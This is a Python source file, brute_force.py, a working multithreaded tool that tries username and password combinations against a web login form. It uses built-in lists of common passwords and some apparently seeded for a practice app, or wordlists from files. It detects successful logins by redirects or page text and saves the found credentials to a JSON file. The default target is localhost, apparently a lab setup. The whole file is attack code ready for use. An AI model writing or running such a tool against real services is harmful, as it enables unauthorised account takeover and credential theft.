#!/usr/bin/env python3
"""brute_force.py - credential brute forcing against login forms"""

import argparse
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from colorama import Fore, Style, init

init(autoreset=True)

# built-in top passwords including the ones likely used by seed users
BUILTIN_PASSWORDS = [
    "admin123", "password", "sarah2024", "travel99", "emma_pass",
    "123456", "password123", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "shadow", "master", "666666", "qwerty123",
    "mustang", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
    "asdfgh", "hunter", "buster", "soccer", "harley",
    "batman", "andrew", "tigger", "sunshine", "iloveyou",
]

BUILTIN_USERNAMES = ["admin", "john", "sarah", "mike", "emma",
                      "administrator", "root", "user", "test", "guest"]


def banner():
    print(f"{Fore.CYAN}{'='*60}")
    print(f"  brute_force.py - credential brute forcing")
    print(f"{'='*60}{Style.RESET_ALL}\n")


def load_wordlist(path):
    """load a wordlist file, one entry per line"""
    try:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] wordlist not found: {path}")
        return []


def try_login(login_url, username, password, timeout=5):
    """attempt a single login, returns True if successful"""
    try:
        session = requests.Session()
        session.get(login_url, timeout=timeout)

        data = {"username": username, "password": password}
        # don't follow redirects so we can detect 302
        resp = session.post(login_url, data=data, timeout=timeout,
                            allow_redirects=False)

        # on success the app returns 302 redirect to /
        if resp.status_code == 302:
            return True

        # on failure it re-renders login with flash message
        if "Invalid username or password" in resp.text:
            return False

        # if somehow we got a 200 without the error message, check for logged-in signs
        if resp.status_code == 200:
            if "logout" in resp.text.lower():
                return True

        return False

    except requests.ConnectionError:
        return None
    except requests.Timeout:
        return None


def brute_force(base_url, usernames, passwords, threads=5):
    """run the brute force attack with threading"""
    login_url = f"{base_url}/login"
    total = len(usernames) * len(passwords)
    found = []
    tested = 0
    start_time = time.time()

    print(f"{Fore.YELLOW}[*] target: {login_url}")
    print(f"{Fore.YELLOW}[*] usernames: {len(usernames)}, passwords: {len(passwords)}")
    print(f"{Fore.YELLOW}[*] total combinations: {total}")
    print(f"{Fore.YELLOW}[*] threads: {threads}\n")

    def attempt(username, password):
        return username, password, try_login(login_url, username, password)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(attempt, username, password))

        for future in as_completed(futures):
            tested += 1
            username, password, result = future.result()

            if result is True:
                print(f"{Fore.RED}  [+] FOUND: {username}:{password}")
                found.append({"username": username, "password": password})
            elif result is None:
                pass
            else:
                if tested % 50 == 0 or tested == total:
                    elapsed = time.time() - start_time
                    rate = tested / elapsed if elapsed > 0 else 0
                    print(f"{Fore.YELLOW}  [*] progress: {tested}/{total} "
                          f"({rate:.0f}/s) - found: {len(found)}", end="\r")

    print()
    return found


def run_brute_force(target_url, usernames=None, passwords=None, user_file=None,
                    pass_file=None, threads=5):
    """main brute force routine"""
    banner()

    if user_file:
        users = load_wordlist(user_file)
    elif usernames:
        users = usernames
    else:
        users = BUILTIN_USERNAMES

    if pass_file:
        passwords_list = load_wordlist(pass_file)
    elif passwords:
        passwords_list = passwords
    else:
        passwords_list = BUILTIN_PASSWORDS

    if not users or not passwords_list:
        print(f"{Fore.RED}[!] empty username or password list")
        return {"credentials": [], "error": "empty wordlists"}

    found = brute_force(target_url, users, passwords_list, threads)

    results = {
        "target": target_url,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "usernames_tested": len(users),
        "passwords_tested": len(passwords_list),
        "total_attempts": len(users) * len(passwords_list),
        "credentials": found
    }

    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  brute force complete")
    print(f"  combinations tested: {results['total_attempts']}")
    print(f"  credentials found: {len(found)}")
    if found:
        for cred in found:
            print(f"    {cred['username']}:{cred['password']}")
    print(f"{'='*60}{Style.RESET_ALL}")

    return results


def main():
    parser = argparse.ArgumentParser(description="brute_force.py - credential brute forcing")
    parser.add_argument("-t", "--target", default="http://localhost:5000",
                        help="target URL")
    parser.add_argument("-U", "--user-file", default=None,
                        help="file with usernames (one per line)")
    parser.add_argument("-P", "--pass-file", default=None,
                        help="file with passwords (one per line)")
    parser.add_argument("-u", "--username", default=None,
                        help="single username to test")
    parser.add_argument("--threads", type=int, default=5,
                        help="number of threads (default: 5)")
    parser.add_argument("-o", "--output", default="brute_results.json",
                        help="output file")
    args = parser.parse_args()

    users = [args.username] if args.username else None
    results = run_brute_force(args.target, usernames=users,
                              user_file=args.user_file,
                              pass_file=args.pass_file,
                              threads=args.threads)

    with open(args.output, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n{Fore.GREEN}[+] results saved to {args.output}")


if __name__ == "__main__":
    main()
